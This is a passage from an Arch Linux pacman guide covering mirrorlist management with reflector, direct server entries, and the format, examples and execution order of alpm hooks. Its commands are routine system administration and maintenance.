- `--sort rate` - Sort by download rate
- `--sort age` - Sort by last sync time
- `--country 'United States,Canada'` - Filter by country
- `--save /path/to/file` - Save to file
- `--fastest N` - Keep only N fastest mirrors

**Example - Country-specific mirrors:**
```
sudo reflector --country 'United States' --latest 10 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**Example - Test speeds:**
```
sudo reflector --latest 50 --protocol https --sort rate --fastest 10 --save /etc/pacman.d/mirrorlist
```

#### Using pacman-mirrors (Manjaro)

Manjaro uses its own mirror management tool:

**Fast-track to best mirrors:**
```
sudo pacman-mirrors --fasttrack
```

**Select by country:**
```
sudo pacman-mirrors --country United_States
```

**Interactive mode:**
```
sudo pacman-mirrors --interactive
```

This presents a GUI for selecting mirrors.

#### Automated Reflector Updates

Enable systemd timer for weekly automatic updates:

**Create reflector configuration:**
```
sudo nano /etc/xdg/reflector/reflector.conf
```

**Example configuration:**
```
--save /etc/pacman.d/mirrorlist
--protocol https
--latest 20
--sort rate
```

**Enable timer:**
```
sudo systemctl enable --now reflector.timer
```

This automatically updates the mirrorlist weekly.

### Direct Server Configuration in pacman.conf

#### Bypass Mirrorlist

Define mirrors directly in `/etc/pacman.conf` without using a mirrorlist file:

```
[core]
Server = https://mirror1.example.com/archlinux/$repo/os/$arch
Server = https://mirror2.example.com/archlinux/$repo/os/$arch

[extra]
Server = https://mirror1.example.com/archlinux/$repo/os/$arch
```

#### Mix Include and Direct Servers

Combine direct servers with mirrorlist:

```
[core]
Server = https://priority-mirror.example.com/archlinux/$repo/os/$arch
Include = /etc/pacman.d/mirrorlist
```

The direct `Server` line is tried first, followed by mirrors from the included file.

### Custom Repository Mirrors

#### Third-Party Repository Configuration

For custom or third-party repositories, specify mirrors directly:

```
[custom-repo]
Server = https://custom-repo.example.com/$arch
Server = https://backup-mirror.example.com/$arch
```

#### Local Mirror Configuration

Use local network mirrors for faster access:

```
[core]
Server = http://192.168.1.100/archlinux/$repo/os/$arch
Include = /etc/pacman.d/mirrorlist
```

The local mirror is tried first, falling back to internet mirrors if unavailable.

#### File Protocol

Use local filesystem as a mirror:

```
[custom-local]
Server = file:///mnt/repo/$arch
```

Useful for offline installations or local package repositories.

### Multiple Mirrorlist Files

#### Separate Mirrorlist for Each Repository

Create repository-specific mirrorlist files:

```
/etc/pacman.d/mirrorlist-core
/etc/pacman.d/mirrorlist-extra
/etc/pacman.d/mirrorlist-multilib
```

Reference them in pacman.conf:
```
[core]
Include = /etc/pacman.d/mirrorlist-core

[extra]
Include = /etc/pacman.d/mirrorlist-extra

[multilib]
Include = /etc/pacman.d/mirrorlist-multilib
```

### Mirror Testing and Selection

#### Test Mirror Speed

Manually test mirror download speeds:

```
curl -o /dev/null https://mirror.example.com/archlinux/core/os/x86_64/core.db
```

Time the download to compare mirrors.

#### Check Mirror Sync Status

Verify mirror freshness:
```
curl -s https://mirror.example.com/archlinux/lastupdate
```

Compare this timestamp with the official Arch repository sync time.

### Troubleshooting Mirror Issues

#### Corrupted Database Errors

If mirrors provide corrupted databases:

**Force refresh:**
```
sudo pacman -Syy
```

**Switch to different mirrors:**
Edit mirrorlist and move reliable mirrors to the top.

#### Slow Downloads

**Switch to geographically closer mirrors:**
```
sudo reflector --country 'YourCountry' --latest 10 --save /etc/pacman.d/mirrorlist
```

**Use faster protocols:**
Prefer HTTPS mirrors over HTTP for better performance in some regions.

#### Mirror Synchronization Delays

Different mirrors sync at different times. If a package isn't available:

**Try multiple mirrors:**
Keep several mirrors active so pacman can fall back to alternatives.

**Wait for sync:**
Newly released packages may take hours to propagate to all mirrors.

### Security Considerations

#### Prefer HTTPS Mirrors

HTTPS provides:
- Encryption during transfer
- Protection against man-in-the-middle attacks
- Integrity verification during download

**Filter for HTTPS only:**
```
sudo reflector --protocol https --latest 20 --save /etc/pacman.d/mirrorlist
```

#### Verify Mirror Authenticity

Mirrors are authenticated through package signatures, not mirror URLs. As long as signature verification is enabled in pacman.conf, packages from any mirror are verified:

```
[options]
SigLevel = Required DatabaseOptional
```

Even if a mirror is compromised, signed packages cannot be tampered with undetected.

### Backup Mirrorlist

Before making changes, backup the current mirrorlist:

```
sudo cp /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist.backup
```

Restore if needed:
```
sudo cp /etc/pacman.d/mirrorlist.backup /etc/pacman.d/mirrorlist
```

### Best Practices

**Maintain multiple mirrors:** Keep 5-10 mirrors active for redundancy.

**Regular updates:** Update mirrorlist monthly with reflector or manually.

**Geographic proximity:** Prioritize mirrors in your region for better speeds.

**HTTPS preference:** Use HTTPS mirrors for security and often better performance.

**Test after changes:** Run `pacman -Sy` to verify mirrors work correctly.

**Monitor performance:** If downloads are slow, regenerate mirrorlist.

**Keep backups:** Preserve working mirrorlist configurations.

**Document changes:** Comment reasons for custom mirror selections in the file.

**Automate when possible:** Use reflector timer for hands-off maintenance.

**Handle failures gracefully:** Multiple mirrors ensure download success if one fails.

Proper mirror configuration significantly impacts package management performance, making system updates faster and more reliable.


# Hooks System

## Alpm Hooks Structure

### Overview

Alpm hooks allow pacman to run automated scripts before or after package transactions. They enable actions like rebuilding initramfs after kernel updates, updating desktop databases, or cleaning caches automatically.[1][5]

### Hook Directories

#### Default Hook Locations

Hooks are stored in two primary directories:

**System hooks (package-provided):**
```
/usr/share/libalpm/hooks/
```

Hooks installed by packages live here. These are managed by pacman and shouldn't be manually modified.[4][1]

**User hooks (custom):**
```
/etc/pacman.d/hooks/
```

User-created custom hooks go here. This is the default directory for custom hooks.[5][1][4]

#### Custom Hook Directories

Additional directories can be specified in `/etc/pacman.conf`:

```
[options]
HookDir = /etc/pacman.d/hooks/
HookDir = /usr/local/share/libalpm/hooks/
```

Multiple `HookDir` directives can be used. Hooks in later directories take precedence over hooks in earlier directories.[6][4]

**Note:** `HookDir` paths are absolute; the root path is not automatically prepended.[4][6]

### Hook File Format

#### File Naming

Hook files must:
- Be placed in a hook directory
- Have a `.hook` file extension
- Use descriptive names (e.g., `nvidia-update.hook`, `clear-cache.hook`)

**Example:**
```
/etc/pacman.d/hooks/orphan-check.hook
```

#### INI-Style Structure

Hooks use an INI-style format with two main sections:

**[Trigger]:** Defines when the hook runs
**[Action]:** Defines what the hook executes

### [Trigger] Section

The Trigger section specifies conditions that activate the hook.

#### Required Directives

**Operation:** Defines which transaction type triggers the hook

```
Operation = Install
Operation = Upgrade
Operation = Remove
```

Multiple `Operation` lines can be specified. Valid values:
- `Install` - Package installation
- `Upgrade` - Package upgrade
- `Remove` - Package removal

**Type:** Defines what kind of target triggers the hook

```
Type = Package
Type = File
```

Values:
- `Package` - Triggers on package operations
- `File` - Triggers on file operations

**Target:** Specifies which packages or files trigger the hook

```
Target = linux
Target = *
Target = usr/lib/modules/*/vmlinuz
```

Values can be:
- Specific package names
- Glob patterns with `*`
- File paths (when `Type = File`)

#### Example Trigger

```
[Trigger]
Operation = Install
Operation = Upgrade
Type = Package
Target = linux
```

This triggers on installation or upgrade of the `linux` package.

### [Action] Section

The Action section defines what the hook executes.

#### Required Directives

**Description:** Human-readable description shown during execution

```
Description = Updating initramfs...
```

**When:** Specifies when to run relative to the transaction

```
When = PreTransaction
When = PostTransaction
```

Values:
- `PreTransaction` - Before transaction commits
- `PostTransaction` - After transaction completes

**Exec:** Command to execute

```
Exec = /usr/bin/mkinitcpio -P
```

This can be any executable with arguments.

#### Optional Directives

**Depends:** List of executables that must exist for the hook to run

```
Depends = mkinitcpio
```

If dependencies are missing, the hook is silently skipped.

**AbortOnFail:** Whether to abort transaction if hook fails (default: no)

```
AbortOnFail
```

Without value, this enables aborting on failure.

**NeedsTargets:** Pass trigger targets to the Exec command

```
NeedsTargets
```

When enabled, triggered targets are passed as arguments to the command.

### Complete Hook Examples

#### Example 1: Orphan Package Notification

Notify when packages become orphaned:

```
# /etc/pacman.d/hooks/orphan-check.hook
[Trigger]
Operation = Remove
Operation = Install
Operation = Upgrade
Type = Package
Target = *

[Action]
Description = Checking for orphaned packages...
When = PostTransaction
Exec = /usr/bin/bash -c "/usr/bin/pacman -Qtd || /usr/bin/echo '=> None found.'"
```

This checks for orphans after any package operation.[3][5]

#### Example 2: Cache Cleaning

Automatically clean package cache after upgrades:

```
# /etc/pacman.d/hooks/paccache-clean.hook
[Trigger]
Operation = Upgrade
Operation = Install
Operation = Remove
Type = Package
Target = *

[Action]
Description = Cleaning package cache...
When = PostTransaction
Exec = /usr/bin/paccache -rk3
```

This keeps only the 3 most recent versions after transactions.

#### Example 3: NVIDIA Module Update

Rebuild NVIDIA modules after kernel updates:

```
# /etc/pacman.d/hooks/nvidia-update.hook
[Trigger]
Operation = Install
Operation = Upgrade
Operation = Remove
Type = Package
Target = nvidia
Target = linux

[Action]
Description = Updating NVIDIA module...
When = PostTransaction
Depends = nvidia-dkms
Exec = /usr/bin/dkms autoinstall
```

This ensures NVIDIA drivers are rebuilt when the kernel or driver updates.

#### Example 4: Desktop Database Update

Update desktop file database when .desktop files change:

```
# /etc/pacman.d/hooks/update-desktop-database.hook
[Trigger]
Type = File
Operation = Install
Operation = Upgrade
Operation = Remove
Target = usr/share/applications/*.desktop

[Action]
Description = Updating desktop file database...
When = PostTransaction
Exec = /usr/bin/update-desktop-database --quiet
```

This triggers on .desktop file changes using file-based matching.

### Hook Execution Order

#### Precedence Rules

When multiple hooks match the same trigger:

1. Hooks are sorted alphabetically by filename
2. Hooks in later `HookDir` directories override earlier ones with the same name
3. All matching hooks execute in sorted order

#### Execution Timing

**PreTransaction hooks:**
- Run before any file operations
- Can abort transaction if `AbortOnFail` is set
- Useful for validation or preparation

**PostTransaction hooks:**
- Run after all file operations complete
- Cannot abort the transaction
- Useful for cleanup, notifications, or system updates

### Hook Limitations

**Not interactive:** Hooks cannot prompt for user input. Pacman hooks are non-interactive by design.[1]

**Root context:** Hooks run with root privileges as part of the pacman process.[2]

**No output capture:** Hook output goes to stdout/stderr; pacman doesn't capture or process it.

**Execution order:** Can't guarantee order between different hooks beyond alphabetical sorting.

### Debugging Hooks

#### Test Hook Execution

View which hooks would run without executing:

```
pacman -S package_name --print
```

Check pacman output for "running" messages showing hook execution.

#### Verbose Output

Enable debug mode to see hook details:

```
pacman -S package_name --debug
```

This shows hook matching and execution information.

#### Check Hook Syntax

Validate hook file syntax by reading it:

```
cat /etc/pacman.d/hooks/your-hook.hook
```

Ensure proper INI format with correct section headers and directives.

### Best Practices

**Descriptive names:** Use clear, descriptive hook filenames indicating their purpose.

**Specific targets:** Target specific packages when possible rather than using `Target = *` to avoid unnecessary executions.

**Error handling:** Include error checking in Exec commands, especially for critical operations.

**Dependencies:** Specify `Depends` to prevent hooks from failing when required executables are missing.

**AbortOnFail judiciously:** Only use for critical operations where failure should prevent package installation.

**Document hooks:** Add comments in hook files explaining their purpose and behavior.

**Test before deploying:** Test custom hooks on non-production systems first.

**Minimal logic:** Keep hooks simple; use external scripts for complex operations.

**Consider performance:** Avoid resource-intensive operations in hooks that run frequently.

Alpm hooks provide powerful automation capabilities for maintaining system consistency and automating routine tasks during package management operations.

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] Use Pacman Hooks to Cleanup Disk Space - archlinux https://www.reddit.com/r/archlinux/comments/1fgs5ex/use_pacman_hooks_to_cleanup_disk_space/
[3] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[4] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[5] Pacman - Stéphane's cheat sheets https://cheatsheets.stephane.plus/distros/arch-based/pacman/
[6] pacman.conf(5) - Arch manual pages https://man.archlinux.org/man/pacman.conf.5.en
[7] desbma/pacman-hooks: Arch Linux ... https://github.com/desbma/pacman-hooks
[8] [SOLVED] New "HOOKS" configuration / Pacman & ... https://bbs.archlinux.org/viewtopic.php?id=159203
[9] How to Use Pacman in Arch Linux https://smarttech101.com/how-to-use-pacman-in-arch-linux
[10] A friendly guide to Pacman on Arch Linux and Arch-based ... https://www.youtube.com/watch?v=Napx5_6iBJ4

## Creating Custom Hooks

### Basic Hook Creation Process

Creating custom pacman hooks involves writing an INI-style configuration file and placing it in the appropriate directory. Hooks automate tasks during package operations without manual intervention.

### Step-by-Step Hook Creation

#### Step 1: Create Hook Directory

Ensure the custom hooks directory exists:

```
sudo mkdir -p /etc/pacman.d/hooks/
```

User-created hooks should be placed in `/etc/pacman.d/hooks/` to avoid conflicts with package-managed hooks in `/usr/share/libalpm/hooks/`.

#### Step 2: Create Hook File

Create a new hook file with a descriptive name and `.hook` extension:

```
sudo nano /etc/pacman.d/hooks/your-hook-name.hook
```

#### Step 3: Define Trigger Section

Specify when the hook should activate:

```
[Trigger]
Operation = Install
Operation = Upgrade
Type = Package
Target = package-name
```

**Key decisions:**
- Which operations trigger it? (Install, Upgrade, Remove)
- Package-based or file-based trigger?
- Specific targets or all packages (`*`)?

#### Step 4: Define Action Section

Specify what the hook executes:

```
[Action]
Description = Performing custom action...
When = PostTransaction
Exec = /path/to/command --options
```

**Key decisions:**
- PreTransaction or PostTransaction?
- What command to run?
- Should failure abort the transaction?

#### Step 5: Save and Test

Save the file and test by performing the triggering operation:

```
sudo pacman -S target-package
```

Watch for the hook's description message during execution.

### Practical Hook Examples

#### Example 1: Automatic Orphan Cleanup

Remove orphaned packages automatically after removals:

```
# /etc/pacman.d/hooks/remove-orphans.hook
[Trigger]
Operation = Remove
Type = Package
Target = *

[Action]
Description = Removing orphaned packages...
When = PostTransaction
Exec = /bin/sh -c "pacman -Qtdq | pacman -Rns --noconfirm - || true"
```

**Note:** The `|| true` prevents failure if no orphans exist.

#### Example 2: System Cleanup After Upgrades

Perform comprehensive cleanup after system upgrades:

```
# /etc/pacman.d/hooks/cleanup-after-upgrade.hook
[Trigger]
Operation = Upgrade
Type = Package
Target = *

[Action]
Description = Cleaning system after upgrade...
When = PostTransaction
Exec = /usr/local/bin/system-cleanup.sh
```

**Companion script** (`/usr/local/bin/system-cleanup.sh`):

```bash
#!/bin/bash
# Clean package cache
paccache -rk2
# Remove orphans
orphans=$(pacman -Qtdq)
if [ -n "$orphans" ]; then
    echo "$orphans" | pacman -Rns --noconfirm -
fi
# Clean journal
journalctl --vacuum-time=2weeks
```

Make it executable:
```
sudo chmod +x /usr/local/bin/system-cleanup.sh
```

#### Example 3: Kernel Update Notification

Notify when kernel updates require reboot:

```
# /etc/pacman.d/hooks/kernel-reboot-notify.hook
[Trigger]
Operation = Upgrade
Type = Package
Target = linux
Target = linux-lts
Target = linux-zen

[Action]
Description = Kernel updated - reboot required!
When = PostTransaction
Exec = /usr/bin/notify-send -u critical "Kernel Updated" "System reboot required to use new kernel"
```

**Note:** This requires a desktop environment with notification support.

#### Example 4: Backup Before Critical Updates

Backup important configurations before upgrading critical packages:

```
# /etc/pacman.d/hooks/backup-before-critical.hook
[Trigger]
Operation = Upgrade
Type = Package
Target = systemd
Target = glibc
Target = pacman

[Action]
Description = Backing up critical configurations...
When = PreTransaction
Exec = /usr/local/bin/backup-configs.sh
AbortOnFail
```

**Companion script:**

```bash
#!/bin/bash
BACKUP_DIR="/var/backups/pacman-critical"
DATE=$(date +%Y%m%d_%H%M%S)

mkdir -p "$BACKUP_DIR"
tar -czf "$BACKUP_DIR/configs-$DATE.tar.gz" \
    /etc/pacman.conf \
    /etc/pacman.d/ \
    /etc/systemd/ \
    /boot/loader/

echo "Backup created: $BACKUP_DIR/configs-$DATE.tar.gz"
```

#### Example 5: Database Optimization

Optimize package database after major operations:

```
# /etc/pacman.d/hooks/optimize-database.hook
[Trigger]
Operation = Install
Operation = Remove
Operation = Upgrade
Type = Package
Target = *

[Action]
Description = Optimizing package database...
When = PostTransaction
Exec = /bin/sh -c "pacman-db-upgrade && paccache -rk3"
```

#### Example 6: Update Mirror List Weekly

Refresh mirror list when packages are upgraded (with rate limiting):

```
# /etc/pacman.d/hooks/update-mirrorlist.hook
[Trigger]
Operation = Upgrade
Type = Package
Target = pacman-mirrorlist

[Action]
Description = Updating mirror list...
When = PostTransaction
Depends = reflector
Exec = /usr/bin/reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

This only runs when `pacman-mirrorlist` package updates.

#### Example 7: File-Based Trigger

Update icon cache when icon files change:

```
# /etc/pacman.d/hooks/icon-cache.hook
[Trigger]
Type = File
Operation = Install
Operation = Upgrade
Operation = Remove
Target = usr/share/icons/*

[Action]
Description = Updating icon cache...
When = PostTransaction
Exec = /usr/bin/gtk-update-icon-cache -q -t -f /usr/share/icons/hicolor
```

#### Example 8: Conditional Hook with Dependencies

Only run if specific tools are installed:

```
# /etc/pacman.d/hooks/flatpak-update.hook
[Trigger]
Operation = Upgrade
Type = Package
Target = flatpak

[Action]
Description = Updating Flatpak applications...
When = PostTransaction
Depends = flatpak
Exec = /usr/bin/flatpak update --noninteractive
```

If `flatpak` isn't installed, the hook is silently skipped.

### Advanced Hook Techniques

#### Using NeedsTargets

Pass triggered package names to the script:

```
# /etc/pacman.d/hooks/log-upgrades.hook
[Trigger]
Operation = Upgrade
Type = Package
Target = *

[Action]
Description = Logging upgraded packages...
When = PostTransaction
NeedsTargets
Exec = /usr/local/bin/log-packages.sh
```

**Script receives package names as arguments:**

```bash
#!/bin/bash
# /usr/local/bin/log-packages.sh
LOG_FILE="/var/log/pacman-upgrades.log"
DATE=$(date '+%Y-%m-%d %H:%M:%S')

for package in "$@"; do
    echo "[$DATE] Upgraded: $package" >> "$LOG_FILE"
done
```

#### Combining Multiple Triggers

Match multiple conditions:

```
[Trigger]
Operation = Install
Operation = Upgrade
Type = Package
Target = linux
Target = linux-headers
Target = nvidia
Target = nvidia-dkms
```

This triggers on any of these packages being installed or upgraded.

#### Error Handling in Hooks

Ensure hooks don't break transactions:

```
[Action]
Description = Running optional cleanup...
When = PostTransaction
Exec = /bin/sh -c "cleanup-command || echo 'Cleanup failed but continuing'"
```

Or use `AbortOnFail` only for critical operations:

```
[Action]
Description = Critical validation...
When = PreTransaction
Exec = /usr/local/bin/validate-system.sh
AbortOnFail
```

### Testing Custom Hooks

#### Dry Run Testing

Test without actual installation:

```
pacman -S package_name --print
```

This shows what would happen but doesn't execute.

#### Verbose Testing

See detailed hook execution:

```
pacman -S package_name --debug 2>&1 | grep -i hook
```

#### Manual Hook Execution

Test the command independently:

```
/path/to/command --options
```

Ensure it works correctly before integrating into a hook.

### Common Pitfalls

**Avoid interactive commands:** Hooks run non-interactively; commands requiring user input will hang or fail.

**Path issues:** Use absolute paths for all executables and files.

**Permissions:** Hooks run as root but may need to consider file ownership.

**Exit codes:** Non-zero exit codes can abort transactions if `AbortOnFail` is set.

**Performance:** Slow hooks delay package operations; keep them efficient.

**Infinite loops:** Don't create hooks that trigger themselves (e.g., a hook that runs `pacman -S`).

### Debugging Hook Issues

#### Check Hook Syntax

Validate INI format:
```
cat /etc/pacman.d/hooks/your-hook.hook
```

Ensure proper section headers and directive names.

#### View Hook Output

Watch pacman output during operations:
```
sudo pacman -S package_name
```

Look for your hook's description message.

#### Test Hook Command Directly

Run the `Exec` command manually:
```
sudo /path/to/command --options
```

Verify it executes without errors.

#### Check Dependencies

Ensure `Depends` executables exist:
```
which dependency-name
```

### Disabling Hooks Temporarily

#### Rename Hook File

Temporarily disable without deleting:
```
sudo mv /etc/pacman.d/hooks/hook.hook /etc/pacman.d/hooks/hook.hook.disabled
```

Re-enable:
```
sudo mv /etc/pacman.d/hooks/hook.hook.disabled /etc/pacman.d/hooks/hook.hook
```

#### Use NoExtract

Prevent specific hook from loading (in `/etc/pacman.conf`):
```
[options]
NoExtract = etc/pacman.d/hooks/problematic-hook.hook
```

### Best Practices

**Start simple:** Begin with basic hooks and gradually add complexity.

**Test thoroughly:** Test hooks on non-production systems first.

**Use descriptive names:** Filename should indicate purpose (e.g., `nvidia-rebuild.hook`).

**Document purpose:** Add comments at the top of hook files.

**Handle errors gracefully:** Use `|| true` or proper error handling to prevent transaction failures.

**Specify dependencies:** Use `Depends` to prevent failures when tools are missing.

**Avoid side effects:** Don't modify the system state unexpectedly.

**Consider timing:** Choose PreTransaction or PostTransaction appropriately.

**Keep hooks focused:** One hook, one purpose.

**Log actions:** Consider logging what hooks do for troubleshooting.

Custom hooks are powerful automation tools that keep your Arch Linux system maintained, optimized, and consistent without manual intervention after package operations.

## Hook Execution Order

### Basic Execution Sequence

Pacman hooks execute in a specific order based on several factors. Understanding this order is crucial for creating hooks that work correctly, especially when hooks depend on each other or modify the system state.

### Primary Execution Phases

#### PreTransaction Hooks

Hooks with `When = PreTransaction` run **before** any file operations occur:

**Execution sequence:**
1. Database is synced
2. Dependencies are resolved
3. **PreTransaction hooks execute**
4. Files are extracted and installed
5. PostTransaction hooks execute

**Use cases:**
- System validation before changes
- Creating backups
- Checking available disk space
- Preparing the environment
- Operations that might abort the transaction

#### PostTransaction Hooks

Hooks with `When = PostTransaction` run **after** all file operations complete:

**Execution sequence:**
1. Database is synced
2. Dependencies are resolved
3. PreTransaction hooks execute
4. Files are extracted and installed
5. **PostTransaction hooks execute**

**Use cases:**
- Updating system caches
- Rebuilding initramfs
- Cleaning package cache
- Sending notifications
- Running system optimizations
- Operations that finalize the installation

### Alphabetical Ordering

Within each phase (PreTransaction or PostTransaction), hooks execute in **alphabetical order by filename**.

#### Example Ordering

Given these hook files:
```
/etc/pacman.d/hooks/10-backup.hook
/etc/pacman.d/hooks/20-validate.hook
/etc/pacman.d/hooks/30-cleanup.hook
/etc/pacman.d/hooks/50-notify.hook
```

They execute in this order:
1. `10-backup.hook`
2. `20-validate.hook`
3. `30-cleanup.hook`
4. `50-notify.hook`

#### Numbering Convention

A common practice is prefixing hook names with numbers to control execution order:

```
00-critical-first.hook
10-prepare-environment.hook
20-backup-configs.hook
50-main-operation.hook
90-cleanup.hook
99-final-notification.hook
```

This ensures predictable ordering regardless of alphabetical sorting.

### Directory Precedence

When multiple `HookDir` directories are configured in `/etc/pacman.conf`, **later directories take precedence** for hooks with the same name:

```
[options]
HookDir = /usr/share/libalpm/hooks/
HookDir = /etc/pacman.d/hooks/
```

**Precedence rules:**
1. If a hook exists in both directories with the same filename, only the one from `/etc/pacman.d/hooks/` executes
2. This allows overriding system-provided hooks with custom versions
3. Different hook names from both directories all execute (in alphabetical order)

**Example:**

**System hook:** `/usr/share/libalpm/hooks/update-cache.hook`
**User hook:** `/etc/pacman.d/hooks/update-cache.hook`

Only the user hook executes, overriding the system version.

### Execution Order Example

#### Multiple Hooks Scenario

Consider these hooks:

**PreTransaction hooks:**
```
/etc/pacman.d/hooks/10-backup.hook          (When = PreTransaction)
/etc/pacman.d/hooks/20-validate.hook        (When = PreTransaction)
/usr/share/libalpm/hooks/systemd-check.hook (When = PreTransaction)
```

**PostTransaction hooks:**
```
/etc/pacman.d/hooks/50-rebuild-initramfs.hook (When = PostTransaction)
/etc/pacman.d/hooks/90-cleanup.hook           (When = PostTransaction)
/usr/share/libalpm/hooks/update-icon-cache.hook (When = PostTransaction)
```

**Full execution order:**
1. `10-backup.hook` (PreTransaction)
2. `20-validate.hook` (PreTransaction)
3. `systemd-check.hook` (PreTransaction)
4. **[Package installation occurs]**
5. `50-rebuild-initramfs.hook` (PostTransaction)
6. `90-cleanup.hook` (PostTransaction)
7. `update-icon-cache.hook` (PostTransaction)

### Controlling Hook Order

#### Using Numeric Prefixes

Ensure desired execution order with numbered prefixes:

**For sequential operations:**
```
10-stop-service.hook          # Stop service first
20-update-package.hook        # Then handle package
30-configure.hook             # Configure after update
40-start-service.hook         # Restart service last
```

#### Critical Operations First

Place critical hooks early in the sequence:

```
00-disk-space-check.hook      # Check space before anything
05-backup-critical.hook       # Backup before changes
...
95-cleanup.hook               # Clean up after all operations
99-notify-completion.hook     # Final notification
```

#### Dependencies Between Hooks

**Problem:** Hook B depends on Hook A completing first.

**Solution:** Use numeric prefixes to enforce order:

```
10-create-backup.hook         # Creates backup
20-verify-backup.hook         # Verifies the backup created by 10-
```

Alternatively, combine operations into a single hook with a script that handles sequencing.

### Trigger-Based Execution

Hooks only execute if their triggers match the current transaction:

#### Selective Execution Example

**Transaction:** `pacman -S firefox`

**Hooks:**
```
kernel-update.hook    (Target = linux)           → Not executed
firefox-cache.hook    (Target = firefox)         → Executed
all-packages.hook     (Target = *)               → Executed
nvidia-rebuild.hook   (Target = nvidia)          → Not executed
```

Only hooks matching the transaction targets execute, in alphabetical order within their timing phase.

### Complex Ordering Scenarios

#### Multiple Operations with Different Triggers

**Transaction:** `pacman -S linux nvidia`

**PreTransaction execution order:**
1. Hooks targeting `linux` (alphabetically)
2. Hooks targeting `nvidia` (alphabetically)
3. Hooks targeting `*` (alphabetically)

Actually, all matching hooks execute alphabetically regardless of which specific package triggered them.

#### Override System Hook

**System hook:** `/usr/share/libalpm/hooks/30-update-desktop-database.hook`
**Custom hook:** `/etc/pacman.d/hooks/30-update-desktop-database.hook`

The custom hook completely replaces the system hook with the same name. The system version doesn't execute at all.

### Practical Application

#### Example: Kernel Update Workflow

Create a coordinated kernel update process:

```
# /etc/pacman.d/hooks/10-kernel-pre-backup.hook
[Trigger]
Operation = Upgrade
Type = Package
Target = linux

[Action]
Description = Backing up current kernel...
When = PreTransaction
Exec = /usr/local/bin/backup-kernel.sh
```

```
# /etc/pacman.d/hooks/90-kernel-post-rebuild.hook
[Trigger]
Operation = Upgrade
Type = Package
Target = linux

[Action]
Description = Rebuilding initramfs...
When = PostTransaction
Exec = /usr/bin/mkinitcpio -P
```

```
# /etc/pacman.d/hooks/95-kernel-notify.hook
[Trigger]
Operation = Upgrade
Type = Package
Target = linux

[Action]
Description = Kernel updated - reboot required
When = PostTransaction
Exec = /usr/bin/notify-send "Kernel Update" "Reboot required for new kernel"
```

**Execution flow:**
1. `10-kernel-pre-backup.hook` (backup before changes)
2. **[Kernel files installed]**
3. `90-kernel-post-rebuild.hook` (rebuild initramfs)
4. `95-kernel-notify.hook` (notify user)

#### Example: Cleanup Chain

Create sequential cleanup operations:

```
# 10-remove-orphans.hook
[Action]
Description = Removing orphaned packages...
When = PostTransaction
Exec = /bin/sh -c "pacman -Qtdq | pacman -Rns --noconfirm - || true"
```

```
# 20-clean-cache.hook
[Action]
Description = Cleaning package cache...
When = PostTransaction
Exec = /usr/bin/paccache -rk2
```

```
# 30-journal-cleanup.hook
[Action]
Description = Cleaning system journal...
When = PostTransaction
Exec = /usr/bin/journalctl --vacuum-time=2weeks
```

All execute in order after transaction completes.

### Debugging Execution Order

#### View Hook Execution

Watch hooks execute during package operations:

```
sudo pacman -S package_name
```

Observe the "Description" messages showing which hooks run and in what order.

#### Debug Mode

Enable verbose output to see hook matching and execution:

```
sudo pacman -S package_name --debug 2>&1 | grep -E "(hook|running)"
```

This shows detailed information about hook discovery and execution.

#### List All Hooks

Find all hooks on the system:

```
find /usr/share/libalpm/hooks/ /etc/pacman.d/hooks/ -name "*.hook" -type f | sort
```

This shows all available hooks in alphabetical order.

### Best Practices

**Use numeric prefixes:** Prefix hook names with numbers (00-99) to control execution order explicitly.

**Group related hooks:** Use number ranges for related operations (10-19 for backups, 20-29 for validation, etc.).

**Document dependencies:** Add comments in hooks explaining ordering requirements.

**Test individually:** Test hooks in isolation before relying on specific execution order.

**Avoid assumptions:** Don't assume system hooks execute at specific times; they may change.

**Consider timing:** Choose PreTransaction or PostTransaction based on when the operation logically fits.

**Keep it simple:** Minimize dependencies between hooks; prefer self-contained operations.

**Name descriptively:** Even with numeric prefixes, use descriptive names (e.g., `10-backup-kernel.hook`).

Understanding hook execution order ensures your custom automation works predictably and reliably across package operations.

## System and User Hooks

### Overview

Pacman uses two distinct categories of hooks: system hooks provided by packages and user hooks created by administrators. Understanding the difference between these categories is essential for effective hook management and customization.

### System Hooks

#### Location

System hooks are installed by packages and reside in:

```
/usr/share/libalpm/hooks/
```

This directory is managed by pacman and contains hooks that packages install as part of their normal operation.

#### Characteristics

**Package-managed:** System hooks are installed, updated, and removed by packages through pacman.

**Automatic installation:** When you install a package that includes hooks, they're automatically placed in `/usr/share/libalpm/hooks/`.

**Should not be modified:** These hooks are tracked by pacman's database. Manual modifications will be overwritten during package updates.

**Maintained by package maintainers:** Package developers create and maintain these hooks to ensure proper system integration.

#### Common System Hooks

**fontconfig.hook:** Updates font cache when fonts are installed
**update-desktop-database.hook:** Updates desktop file database
**gtk-update-icon-cache.hook:** Updates icon cache for GTK applications
**systemd-daemon-reload.hook:** Reloads systemd when unit files change
**depmod.hook:** Updates kernel module dependencies
**texinfo-install.hook:** Updates GNU Info directory

#### Viewing System Hooks

List all system hooks:

```
ls -la /usr/share/libalpm/hooks/
```

View contents of a system hook:

```
cat /usr/share/libalpm/hooks/fontconfig.hook
```

#### Which Packages Provide Hooks

Find which package owns a system hook:

```
pacman -Qo /usr/share/libalpm/hooks/fontconfig.hook
```

**Example output:**
```
/usr/share/libalpm/hooks/fontconfig.hook is owned by fontconfig 2.14.0-1
```

### User Hooks

#### Location

User hooks are custom hooks created by system administrators and reside in:

```
/etc/pacman.d/hooks/
```

This is the default directory for custom user-created hooks.

#### Characteristics

**User-created:** These hooks are manually written by administrators to customize system behavior.

**Not package-managed:** User hooks are not tracked by any package and persist through system updates.

**Full control:** You have complete control over creation, modification, and deletion.

**Custom automation:** Used to implement site-specific or personal automation needs.

#### Creating the Directory

Ensure the user hooks directory exists:

```
sudo mkdir -p /etc/pacman.d/hooks/
```

This directory doesn't exist by default and must be created before placing custom hooks.

#### Common User Hook Examples

**Custom cache cleaning:**
```
/etc/pacman.d/hooks/clean-cache.hook
```

**Orphan package removal:**
```
/etc/pacman.d/hooks/remove-orphans.hook
```

**Custom notifications:**
```
/etc/pacman.d/hooks/update-notify.hook
```

**Backup automation:**
```
/etc/pacman.d/hooks/backup-configs.hook
```

**Service management:**
```
